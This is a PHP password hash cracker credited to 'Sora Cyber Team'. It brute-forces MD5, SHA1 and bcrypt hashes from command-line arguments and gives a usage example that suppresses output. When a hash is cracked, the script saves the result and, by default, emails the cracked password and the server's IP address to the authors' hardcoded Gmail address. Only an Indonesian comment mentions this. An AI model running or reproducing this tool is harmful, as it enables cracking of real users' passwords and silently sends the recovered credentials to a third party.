<?php
/*
		{ Advanced Hash Cracker v2 }
	@author : FilthyRoot
	@github : soracyberteam
	@date   : 16 May 2019

	Copyright (c) 2019 Sora Cyber Team
	INDONESIAN PEOPLE

	GANTI EMAIL DI LINE KE 67 DAN 73
*/
error_reporting(0);
set_time_limit(0);
#$charset="aiueobcdfghjklmnpqrstvwxyzAIUEO1234567890#@!";
$charset=$argv['5'];
$p=strlen($charset);
$min=$argv['3'];
$max=$argv['4'];
$type=$argv['2'];
$auth=$argv['1'];
function hasher($pass,$auth,$type){
	if($type=="md5"){
		$x=md5($pass);
		if($x == $auth){
			$x="TRUE";
		}else{
			$x="";
		}
	}elseif($type=="sha1"){
		$x=sha1($pass);
		if($x == $auth){
			$x="TRUE";
		}else{
			$x="";
		}
	}elseif($type=="bcrypt"){
		if(password_verify($pass, $auth)){
			$x="TRUE";
		}else{
			$x="";
		}
	}
	return $x;
}
function crunch($a,$b,$c){
	global $charset,$p;
	for($i=0;$i < $p;$i++){
		if($a > $b-1){
			crunch($a, $b+1, $c.$charset[$i]);
		}
		check($c.$charset[$i]);
	}
}
function check($pwnd){
	global $type,$auth;
	if(hasher($pwnd,$auth,$type)=="TRUE"){
		$fh=fopen("h_crack.txt",a);
		fwrite($fh,"$auth => $pwnd | Type : $type\n");
		fclose($fh);
		$ip1=$_SERVER['REMOTE_ADDR'];
		$ip2=$_SERVER['SERVER_ADDR'];
		$content=file_get_contents('h_crack.txt');
		$From="Hash_Cracker";
		$Subject="Cracked!";
		$Message="Server : $zzz // $ip2<br><pre>$content</pre>";
		$Emails="soracyberteam@gmail.com";
		$Name="hash_cracker";
		$headers	= "MIME-Version: 1.0\r\n";
		$headers .=	"Content-type:text/html;charset=UTF-8\r\n";
		$headers	.= "From: <".$From.">\r\n";
		$headers	.= "Cc: ".$Name."\r\n";
		$Emails	= explode("\r\n", "soracyberteam@gmail.com");
		foreach($Emails as $email) {
			mail($email,$Subject,$Message,$headers);
		}
		exit();
	}else{
		#echo "$pwnd\n";
	}
}
if($auth && $type && $min && $max && $charset){
	for($x=$min;$x<$max+1;$x++){
		crunch("$x","0","");
	}
}else{
	echo "{ Advanced Hash Cracker V2 }
Usage : php ".$_SERVER['PHP_SELF']." '<hash>' <type> <min> <max> <charset>
Type  : -md5
        -bcrypt (CMS Sekolahku) (SLOWER)
        -sha1

Example : php ".$_SERVER['PHP_SELF']." '594f803b380a41396ed63dca39503542' md5 5 8 'abcdefghijklmnopqrstuvwxyz' > /dev/null 2>&1
Copyright (c) 2019 Sora Cyber Team 
";
}
?>
